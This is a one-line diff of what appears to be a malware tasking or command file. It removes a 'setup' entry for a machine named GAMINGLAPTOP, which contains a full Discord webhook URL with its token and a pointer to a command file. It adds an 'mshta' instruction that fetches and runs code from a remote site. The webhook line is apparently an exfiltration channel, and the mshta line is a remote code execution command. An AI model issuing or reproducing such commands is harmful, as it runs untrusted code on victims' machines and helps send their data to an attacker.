@@ -1,1 +1,1 @@
-setup:GAMINGLAPTOP:https://discord.com/api/webhooks/1553831865318903812/Gmv95f6qFIZwql_HwgDc68zcPUqXIkUUNSiskBGXDsbTj2yMYM_H2_Wf71ACjVw0dieL;cmd-gaminglaptop.txt|1790532785
+mshta:https://dicechecker.app|1790532792
